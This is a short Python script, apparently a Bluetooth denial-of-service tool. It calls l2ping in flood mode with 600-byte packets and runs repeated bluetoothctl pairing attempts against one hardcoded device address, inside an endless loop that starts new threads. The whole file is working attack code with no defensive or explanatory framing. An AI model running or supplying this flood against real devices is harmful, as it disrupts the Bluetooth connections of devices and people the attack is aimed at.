import os
import threading
import time
import subprocess
def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr+' &')
    os.system('bluetoothctl pair 41:42:9F:B4:2E:47 &')

while True:
            try:
                threading.Thread(target=DOS, args=['41:42:9F:B4:2E:47', '600']).start()
            except Exception as e:
                time.sleep(0.1)
                print('[!] ERROR: ' + str(e))
